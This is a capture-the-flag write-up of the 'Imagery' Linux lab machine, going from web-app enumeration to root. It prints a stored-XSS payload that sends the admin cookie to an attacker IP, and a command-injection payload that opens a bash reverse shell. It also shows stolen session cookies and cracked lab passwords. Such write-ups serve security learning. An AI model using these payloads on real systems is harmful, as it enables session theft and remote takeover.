+++
title = 'Imagery'
description = 'Medium Linux'
writeup = true
hideMeta = true
+++

nmap scan
![Imagery (Medium Linux).png](Imagery%20%28Medium%20Linux%29.png)
We have ssh and a http on 8000
ssh version is quite new, so unlikely any exploitable vulns there - so lets go to the web app

Web app using Werkzeug 3.1.3 and Python 3.12.7

The web app is a gallery app, where you can register/login. I made an account
`hacker@imagery.com`
`hacker`

You are able to upload images and see them in your gallery. Playing around with the app, it seems pretty much a single page app and makes calls to the server which returns JSON formatted information.

So I messed with the Post request for /upload_image

![Imagery (Medium Linux)-1.png](Imagery%20%28Medium%20Linux%29-1.png)

So the app does not do a check to make sure the actual image content is an "image", it just checks the extension. It also allows me to upload to other directories, because this image does not show up on the gallery and is an error (this is my assumption)

so, if I upload a key into .ssh folder, I should be able to ssh into the box?

when we upload a legit file, it goes to `/uploads/<IMAGEID>_<ORIGINALFILENAME>.jpg`
![Imagery (Medium Linux)-2.png](Imagery%20%28Medium%20Linux%29-2.png)
![Imagery (Medium Linux)-3.png](Imagery%20%28Medium%20Linux%29-3.png)

my thinking - is there a way we can upload a web shell, but with any of these extensions? we can upload stuff so it works

*CLUE FROM JOREL - it's not file upload! Look at the javascript*

reading the javascript, we see there is an adminPanel and the user has to have isAdmin set to True to access it:
![Imagery (Medium Linux)-4.png](Imagery%20%28Medium%20Linux%29-4.png)
![Imagery (Medium Linux)-5.png](Imagery%20%28Medium%20Linux%29-5.png)
we can see clearly that this is the request which checks the auth state of the user - all the security is client side in the javascript so we can simply modify the response coming back from this request.

okay setting isAdmin in the response works - but I cant access the users list and looking at the javascript, its because the endpoint /admin/users - a call is made and the response in here will contain the information - the only thing being sent here is the cookie

so the check on whether the user is able to do these functionalities lies in the cookie

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Wed, 01 Oct 2025 06:37:31 GMT
Content-Type: application/json
Content-Length: 105
Vary: Cookie
Set-Cookie: session=.eJxNjTEKhEAMRe-SWkRBcLFaS08xhJmoQZORyVjIsnfftVAs33sf_gcC27biMQTooHo1dYtVCwWw9UFYoRtxNTrZsWyULCpm1sllsrwbpeficg69j7vmu51SUej_MaNfKL1ZcKJ0lD4KfH9EwjAE.aNzMKw.cNLfdEa3BUoRY7z60yvsCwuC4sA; Path=/
Connection: close

{
	"displayId":"08417a07",
	"isAdmin":false,
	"isTestuser":false,
	"message":"Login successful.",
	"success":true
}
```

```
# endpoints
/auth_status?t=${new Date().getTime()} - gets permission

/register - add user to database
/login - sets session cookie
/logout - clears cookie
/images - shows images (json)
/delete_image - 
/edit_image_details - not yet implemented
/convert_image - not yet implemented

/apply_visual_transform
/delete_image_metadata
/report_bug

/admin/bug_reports
/admin/delete_bug_report
/admin/delete_user
/admin/users

/get_image_collections
/create_image_collection
/move_images_to_collection
```

{"displayId":"08417a07","isAdmin":false,"is_impersonating_testuser":false,"is_testuser_account":false,"username":"hacker@imagery.com"}.

Looking through /report_bug - we see that
![Imagery (Medium Linux)-6.png](Imagery%20%28Medium%20Linux%29-6.png)

report.details is not being sanatised. There is also a message saying that "admin review in progress" when we report a bug - so we can put a XSS payload here and steal the admin cookie

```html
# xss payload
<img src=x onerror="fetch('http://10.10.16.196/?cookie='+document.cookie)" />
```

we obtain the admin cookie:
![Imagery (Medium Linux)-7.png](Imagery%20%28Medium%20Linux%29-7.png)

`session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNzobw.8BDI3agM4PsQ-47oouktdCell1k`

Using this we are able to see the features of the admin panel.
We are able to 'download log' - the get request for this has directory traversal vulnerability

![Imagery (Medium Linux)-8.png](Imagery%20%28Medium%20Linux%29-8.png)

The interesting users we have on the box are:
```
root
web
mark
dhcpcd
```

Since we only have directory traversal and cant really upload files, lets try to map out and look at the flask app python files

we cause an error by trying to access a file we can't, which leaks a path to us:
![Imagery (Medium Linux)-9.png](Imagery%20%28Medium%20Linux%29-9.png)

/home/web/web/app.py

/home/web/web/templates/index.html exists and is the main page

in the above code, we can see that {user_entry['username']} is something we control

/home/web/web/config.py
looking at the above config.py - we see that there is a `db.json` file.
we also see that `application/pdf` and `pdf` extension is also allowed.
we also see that `/uploads/admin/converted` and `/uploads/admin/transformed` are paths

![Imagery (Medium Linux)-10.png](Imagery%20%28Medium%20Linux%29-10.png)

we have the password for testuser@imagery.htb - lets see if theres anything different with this account

`iambatman`

with this account we are able to hit the "under development" api endpoints

looking at the imports for app.py - we can see there is a utils.py
/home/web/web/utils.py

![Imagery (Medium Linux)-12.png](Imagery%20%28Medium%20Linux%29-12.png)

```json
// post request to /apply_visual_transform

{
	"imageId":"c9ed35a8-5614-4d41-a6b9-7201391e60bf",
	"transformType": "crop",
	"params":{
		"width":"100",
		"height":"100",
		"x":"1",
		"y":";bash -c 'bash -i >& /dev/tcp/10.10.16.196/9000 0>&1'"
	}
}
```

![Imagery (Medium Linux)-11.png](Imagery%20%28Medium%20Linux%29-11.png)

possible priv esc vectors:
![Imagery (Medium Linux)-13.png](Imagery%20%28Medium%20Linux%29-13.png)

![Imagery (Medium Linux)-14.png](Imagery%20%28Medium%20Linux%29-14.png)

![Imagery (Medium Linux)-15.png](Imagery%20%28Medium%20Linux%29-15.png)
![Imagery (Medium Linux)-16.png](Imagery%20%28Medium%20Linux%29-16.png)

got the admin@imager.htb password but dont know if that helps

![Imagery (Medium Linux)-17.png](Imagery%20%28Medium%20Linux%29-17.png)

`strongsandofbeach`


looking around more, there is a backup .zip.aes file in /var/backup
bringing this back to kali vm, there is a password for the encrypted file - lets write a script to brute force the password

![Imagery (Medium Linux)-18.png](Imagery%20%28Medium%20Linux%29-18.png)

![Imagery (Medium Linux)-19.png](Imagery%20%28Medium%20Linux%29-19.png)

`bestfriends`

we get a backup version of the web app and looking in db.json:

![Imagery (Medium Linux)-20.png](Imagery%20%28Medium%20Linux%29-20.png)

we have both mark and web passwords
![Imagery (Medium Linux)-21.png](Imagery%20%28Medium%20Linux%29-21.png)

`mark:supersmash`
`web:spiderweb1234`

using us, we change to mark

![Imagery (Medium Linux)-22.png](Imagery%20%28Medium%20Linux%29-22.png)
![Imagery (Medium Linux)-23.png](Imagery%20%28Medium%20Linux%29-23.png)

doing sudo -l shows that the charcol binary is able to run as sudo with no password by mark

we can start a charcol shell

![Imagery (Medium Linux)-24.png](Imagery%20%28Medium%20Linux%29-24.png)

seeing in the help we can create cron jobs - create a reverse shell cron job

catch it
![Imagery (Medium Linux)-25.png](Imagery%20%28Medium%20Linux%29-25.png)

pwned!
